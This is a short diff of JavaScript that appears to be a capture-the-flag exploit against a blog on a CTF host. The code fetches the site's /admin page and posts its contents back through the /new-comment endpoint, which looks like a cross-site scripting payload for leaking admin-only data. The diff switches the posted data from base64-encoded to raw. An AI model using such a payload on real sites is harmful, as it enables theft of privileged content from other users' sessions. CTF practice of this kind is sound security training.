@@ -20,7 +20,7 @@ fetch("http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/admin", {
     }
     throw new Error('Network response was not ok.');
 }).then(data => {
-    output = btoa(data);
+    output = data;
 
     return fetch("http://blog.9f626c1e-d05.ctf.one.dr.punksecurity.cloud:5000/new-comment", {
         "headers": {
